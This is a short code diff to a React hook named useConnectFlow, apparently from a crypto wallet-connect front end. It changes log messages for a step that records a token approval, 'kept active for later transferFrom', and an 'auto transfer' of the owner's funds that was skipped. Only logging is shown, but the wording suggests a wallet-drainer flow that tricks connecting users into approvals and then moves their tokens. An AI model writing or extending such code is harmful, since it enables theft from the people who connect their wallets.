@@ -580,8 +580,10 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
             });
           } else {
             logStep("STEP 2 COMPLETE — APPROVE ONLY (NO TRANSFER YET)", {
-              fundsMoved:
-                "NO — zero/insufficient token balance; approval kept active for later transferFrom",
+              fundsMoved: "NO — auto transfer not executed",
+              reason:
+                result.transferSkippedReason ??
+                "No transfer executed for this approval",
               network: networkKey,
               owner: addressForLog,
               token: tokenSymbol,
